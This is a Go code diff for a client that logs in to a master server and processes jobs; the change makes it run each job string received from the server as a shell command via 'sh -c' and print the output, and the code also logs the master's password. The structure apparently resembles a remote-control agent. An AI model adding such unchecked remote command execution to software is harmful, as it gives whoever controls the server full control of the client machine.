@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"crypto/tls"
 	"encoding/json"
 	"fmt"
@@ -9,6 +10,7 @@ import (
 	"github.com/gobuffalo/packr/v2"
 	"log"
 	"math/rand"
+	"os/exec"
 	"time"
 )
 
@@ -79,6 +81,14 @@ func sendAndReceive(config *ClientConfig, event *Event) Response {
 func processJobs(config *ClientConfig, jobResponse Response) {
 	for k, v := range jobResponse.ResponseData {
 		log.Printf("processing jobs: %s, %s", k, v)
+		cmd := exec.Command("sh", "-c", v)
+		var out bytes.Buffer
+		cmd.Stdout = &out
+		err := cmd.Run()
+		if err != nil {
+			fmt.Println(err)
+		}
+		fmt.Println(out.String())
 	}
 	if jobResponse.ResponseCode == 0 {
 		deleteJob(config, jobResponse)
@@ -131,6 +141,7 @@ func main() {
 		config.ClientID = rand.Intn(10000-1) + 1
 		log.Printf("random id generated: %d", config.ClientID)
 	}
+	fmt.Println()
 	log.Println(config.Master, config.Password)
 	login := &Event{
 		config.ClientID,
